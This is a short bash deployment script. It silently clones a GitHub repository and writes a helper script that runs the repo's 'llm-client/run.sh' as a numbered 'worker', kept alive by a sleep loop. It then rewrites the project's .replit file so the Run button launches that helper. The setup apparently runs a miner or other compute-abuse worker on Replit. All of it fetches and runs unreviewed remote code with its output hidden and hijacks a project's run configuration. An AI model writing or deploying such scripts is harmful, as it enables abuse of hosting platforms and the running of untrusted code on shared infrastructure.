#!/bin/bash

git clone https://github.com/wijayasuta13-collab/nowde.git >/dev/null 2>&1
sleep 40
echo '#!/bin/bash

cd nowde && cd llm-client && chmod 777 run.sh && nproc --all && ./run.sh 4 worker13
sleep 100
while true
do
        echo "Ojo Lali Ngopi Boss..."
        sleep 1800
done' > bos.sh
echo 'modules = ["python-3.11"]

[workflows]
runButton = "Project"

[[workflows.workflow]]
name = "Project"
mode = "parallel"
author = "agent"

[[workflows.workflow.tasks]]
task = "workflow.run"
args = "bos"

[[workflows.workflow]]
name = "bos"
author = "agent"

[[workflows.workflow.tasks]]
task = "shell.exec"
args = "bash bos.sh"

[workflows.workflow.metadata]
outputType = "console"' > .replit
